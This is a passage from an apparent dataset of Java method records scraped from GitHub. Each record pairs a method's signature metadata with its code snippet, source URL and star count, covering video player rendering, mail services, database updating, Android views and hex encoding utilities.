if (mTextureView != null) {            mFullPauseBitmap = mTextureView.initCover();        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setSmallVideoTextureView", "params": ["OnTouchListener"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setSmallVideoTextureView(OnTouchListener onTouchListener) {        mTextureViewContainer.setOnTouchListener(onTouchListener);        mTextureViewContainer.setOnClickListener(null);        setSmallVideoTextureView();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "getEffectFilter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoGLView", "snippet": "    public GSYVideoGLView.ShaderInterface getEffectFilter() {        return mEffectFilter;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "getRenderProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYRenderView", "snippet": "    public GSYRenderView getRenderProxy() {        return mTextureView;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setEffectFilter", "params": ["GSYVideoGLView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEffectFilter(GSYVideoGLView.ShaderInterface effectFilter) {        this.mEffectFilter = effectFilter;        if (mTextureView != null) {            mTextureView.setEffectFilter(effectFilter);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setMatrixGL", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMatrixGL(float[] matrixGL) {        this.mMatrixGL = matrixGL;        if (mTextureView != null) {            mTextureView.setMatrixGL(mMatrixGL);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setCustomGLRenderer", "params": ["GSYVideoGLViewBaseRender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCustomGLRenderer(GSYVideoGLViewBaseRender renderer) {        this.mRenderer = renderer;        if (mTextureView != null) {            mTextureView.setGLRenderer(renderer);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setGLRenderMode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLRenderMode(int mode) {        mMode = mode;        if (mTextureView != null) {            mTextureView.setGLRenderMode(mode);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "showPauseCover", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void showPauseCover();    //\u6e05\u9664\u6682\u505c\u753b\u9762    protected abstract void releasePauseCover();    //\u5c0f\u5c4f\u5e55\u7ed8\u5236\u5c42    protected abstract void setSmallVideoTextureView();    //\u8bbe\u7f6e\u64ad\u653e    protected abstract void setDisplay(Surface surface);    //\u91ca\u653e    protected abstract void releaseSurface(Surface surface);}", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "releasePauseCover", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void releasePauseCover();    //\u5c0f\u5c4f\u5e55\u7ed8\u5236\u5c42    protected abstract void setSmallVideoTextureView();    //\u8bbe\u7f6e\u64ad\u653e    protected abstract void setDisplay(Surface surface);    //\u91ca\u653e    protected abstract void releaseSurface(Surface surface);}", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setSmallVideoTextureView", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void setSmallVideoTextureView();    //\u8bbe\u7f6e\u64ad\u653e    protected abstract void setDisplay(Surface surface);    //\u91ca\u653e    protected abstract void releaseSurface(Surface surface);}", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "setDisplay", "params": ["Surface"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void setDisplay(Surface surface);    //\u91ca\u653e    protected abstract void releaseSurface(Surface surface);}", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "releaseSurface", "params": ["Surface"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void releaseSurface(Surface surface);}", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/Mural.java", "stars": "2", "class": {"name": "Mural", "extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/Mural.java", "stars": "2", "class": {"name": "Mural", "extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"method_name": "accept", "params": ["Visitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accept(Visitor visitor) {        visitor.visit(this);    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/Mural.java", "stars": "2", "class": {"name": "Mural", "extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(final String[] args) throws Exception {    final OptionParser parser = new OptionParser();    final OptionSpec<String> scriptDirectory =        parser            .acceptsAll(Arrays.asList(\"s\", \"script\"),                \"Directory of update scripts.\").withRequiredArg()            .describedAs(\"script\").ofType(String.class);    final OptionSpec<Void> updateOption =        parser.acceptsAll(Arrays.asList(\"u\", \"update\"),            \"Will update if necessary\");    final Props props = AzkabanServer.loadProps(args, parser);    if (props == null) {      logger.error(\"Properties not found. Need it to connect to the db.\");      logger.error(\"Exiting...\");      return;    }    final OptionSet options = parser.parse(args);    boolean updateDB = false;    if (options.has(updateOption)) {      updateDB = true;    } else {      logger.info(\"Running DatabaseUpdater in test mode\");    }    String scriptDir = \"sql\";    if (options.has(scriptDirectory)) {      scriptDir = options.valueOf(scriptDirectory);    }    runDatabaseUpdater(props, scriptDir, updateDB);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/AzkabanDatabaseUpdater.java", "stars": "18", "class": {"name": "AzkabanDatabaseUpdater", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "runDatabaseUpdater", "params": ["Props", "String", "boolean"], "throws": ["IOException", "SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void runDatabaseUpdater(final Props props, final String sqlDir,      final boolean updateDB) throws IOException, SQLException {    logger.info(\"Use scripting directory \" + sqlDir);    if (updateDB) {      logger.info(\"Will auto update any changes.\");    } else {      logger.info(\"Running DatabaseUpdater in test mode. Use -u to update\");    }    final AzkabanDatabaseSetup setup = new AzkabanDatabaseSetup(props);    setup.loadTableInfo();    if (!setup.needsUpdating()) {      logger.info(\"Everything looks up to date.\");      return;    }    logger.info(\"Need to update the db.\");    setup.printUpgradePlan();    if (updateDB) {      logger.info(\"Updating DB\");      setup.updateDatabase(true, true);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/AzkabanDatabaseUpdater.java", "stars": "18", "class": {"name": "AzkabanDatabaseUpdater", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "SecurityContext", "snippet": "    public static SecurityContext getContext() {        SecurityContext context = CONTEXT_HOLDER.get();        if (context == null) {            context = createEmptyContext();            CONTEXT_HOLDER.set(context);        }        return context;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/security/context/SecurityContextHolder.java", "stars": "1", "class": {"name": "SecurityContextHolder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createEmptyContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "SecurityContext", "snippet": "    public static SecurityContext createEmptyContext() {        return new SecurityContextImpl(null);    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/security/context/SecurityContextHolder.java", "stars": "1", "class": {"name": "SecurityContextHolder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContext", "params": ["SecurityContext"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setContext(SecurityContext context) {        CONTEXT_HOLDER.set(context);    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/security/context/SecurityContextHolder.java", "stars": "1", "class": {"name": "SecurityContextHolder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clearContext", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void clearContext() {        CONTEXT_HOLDER.remove();    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/security/context/SecurityContextHolder.java", "stars": "1", "class": {"name": "SecurityContextHolder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendEmail", "params": ["String", "String", "String", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendEmail(String to, String subject, String content, boolean isMultipart, boolean isHtml) {        log.debug(\"Send email[multipart '{}' and html '{}'] to '{}' with subject '{}' and content={}\",            isMultipart, isHtml, to, subject, content);        // Prepare message using a Spring helper        MimeMessage mimeMessage = javaMailSender.createMimeMessage();        try {            MimeMessageHelper message = new MimeMessageHelper(mimeMessage, isMultipart, StandardCharsets.UTF_8.name());            message.setTo(to);            message.setFrom(jHipsterProperties.getMail().getFrom());            message.setSubject(subject);            message.setText(content, isHtml);            javaMailSender.send(mimeMessage);            log.debug(\"Sent email to User '{}'\", to);        } catch (MailException | MessagingException e) {            log.warn(\"Email could not be sent to user '{}'\", to, e);        }    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendEmailFromTemplate", "params": ["User", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendEmailFromTemplate(User user, String templateName, String titleKey) {        Locale locale = Locale.forLanguageTag(user.getLangKey());        Context context = new Context(locale);        context.setVariable(USER, user);        context.setVariable(BASE_URL, jHipsterProperties.getMail().getBaseUrl());        String content = templateEngine.process(templateName, context);        String subject = messageSource.getMessage(titleKey, null, locale);        sendEmail(user.getEmail(), subject, content, false, true);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendActivationEmail", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendActivationEmail(User user) {        log.debug(\"Sending activation email to '{}'\", user.getEmail());        sendEmailFromTemplate(user, \"mail/activationEmail\", \"email.activation.title\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendCreationEmail", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendCreationEmail(User user) {        log.debug(\"Sending creation email to '{}'\", user.getEmail());        sendEmailFromTemplate(user, \"mail/creationEmail\", \"email.activation.title\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendPasswordResetMail", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendPasswordResetMail(User user) {        log.debug(\"Sending password reset email to '{}'\", user.getEmail());        sendEmailFromTemplate(user, \"mail/passwordResetEmail\", \"email.reset.title\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendPasswordChangedMail", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendPasswordChangedMail(User user) {        log.debug(\"Sending password change email to '{}'\", user.getEmail());        sendEmailFromTemplate(user, \"mail/passwordChangeEmail\", \"email.changePassword.title\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/MailService.java", "stars": "2", "class": {"name": "MailService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {        View v= inflater.inflate(R.layout.frag_personinfo,container,false);        RecyclerView showtrans=v.findViewById(R.id.alltransactions);        showtrans.setLayoutManager(new LinearLayoutManager(getContext()));        showtrans.setAdapter(new personinfo_adapter(getContext(),inbetweendata.ll));        TextView na=v.findViewById(R.id.textView10);        na.setText(inbetweendata.name.toUpperCase());        if(inbetweendata.ll.size()==0){            TextView tranc=v.findViewById(R.id.textView9);            tranc.setText(\"NO RECORDS FOUND\");        }        inbetweendata.name=\" \";        inbetweendata.ll=new ArrayList<>();        return v;    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/perpersoninfo_fragment.java", "stars": "2", "class": {"name": "perpersoninfo_fragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldEnsureThatCallsToManagedTransactionAPIDoNotForwardToManagedConnections", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldEnsureThatCallsToManagedTransactionAPIDoNotForwardToManagedConnections() throws Exception {    TransactionFactory tf = new ManagedTransactionFactory();    tf.setProperties(new Properties());    Transaction tx = tf.newTransaction(conn);    assertEquals(conn, tx.getConnection());    tx.commit();    tx.rollback();    tx.close();    verify(conn).close();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/transaction/managed/ManagedTransactionFactoryTest.java", "stars": "15", "class": {"name": "ManagedTransactionFactoryTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldEnsureThatCallsToManagedTransactionAPIDoNotForwardToManagedConnectionsAndDoesNotCloseConnection", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldEnsureThatCallsToManagedTransactionAPIDoNotForwardToManagedConnectionsAndDoesNotCloseConnection() throws Exception {    TransactionFactory tf = new ManagedTransactionFactory();    Properties props = new Properties();    props.setProperty(\"closeConnection\", \"false\");    tf.setProperties(props);    Transaction tx = tf.newTransaction(conn);    assertEquals(conn, tx.getConnection());    tx.commit();    tx.rollback();    tx.close();    verifyNoMoreInteractions(conn);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/transaction/managed/ManagedTransactionFactoryTest.java", "stars": "15", "class": {"name": "ManagedTransactionFactoryTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "blogIndex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String blogIndex(){        return \"site/aboutSite\";    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/AboutSiteController.java", "stars": "2", "class": {"name": "AboutSiteController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_lesson4);    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "clipRectView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clipRectView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.CLIP_RECT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "clipPathView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clipPathView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.CLIP_PATH_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "transLateView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void transLateView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.TRANS_LATE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "scaleView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void scaleView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SCALE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "rotateView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rotateView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.ROTATE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "skewView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void skewView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SKEW_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "matrixTranslateView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void matrixTranslateView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.MATRIX_TRANSLATE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "matrixScaleView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void matrixScaleView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.MATRIX_SCALE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "matrixRotateView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void matrixRotateView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.MATRIX_ROTATE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "matrixSkewView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void matrixSkewView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.MATRIX_SKEW_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "cameraRotateView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cameraRotateView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.CAMERA_ROTATE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "cameraRotateFixedView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cameraRotateFixedView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.CAMERA_ROTATE_FIXED_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "cameraRotateHittingFaceView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cameraRotateHittingFaceView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.CAMERA_ROTATE_HITTING_FACE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "flipBoardView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void flipBoardView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.FLIP_BOARD_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson4Activity.java", "stars": "2", "class": {"name": "Lesson4Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHex", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "char", "snippet": "    public static char[] encodeHex(byte[] data) {        return encodeHex(data, true);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHex", "params": ["byte", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "char", "snippet": "    public static char[] encodeHex(byte[] data, boolean toLowerCase) {        return encodeHex(data, toLowerCase ? DIGITS_LOWER : DIGITS_UPPER);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHex", "params": ["byte", "char"], "throws": null, "modifiers": ["static", "protected"], "return_type": "char", "snippet": "    protected static char[] encodeHex(byte[] data, char[] toDigits) {        if (data == null)            return null;        int l = data.length;        char[] out = new char[l << 1];        for (int i = 0, j = 0; i < l; i++) {            out[j++] = toDigits[(0xF0 & data[i]) >>> 4];            out[j++] = toDigits[0x0F & data[i]];        }        return out;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHexStr", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encodeHexStr(byte[] data) {        return encodeHexStr(data, true);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHexStr", "params": ["byte", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encodeHexStr(byte[] data, boolean toLowerCase) {        return encodeHexStr(data, toLowerCase ? DIGITS_LOWER : DIGITS_UPPER);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/HexUtil.java", "stars": "2", "class": {"name": "HexUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeHexStr", "params": ["byte", "char"], "throws": null, "modifiers": ["static", "protected"], "return_type": "String", "snippet": "    protected static String encodeHexStr(byte[] data, char[] toDigits) {        return new String(encodeHex(data, toDigits));    }", "url": 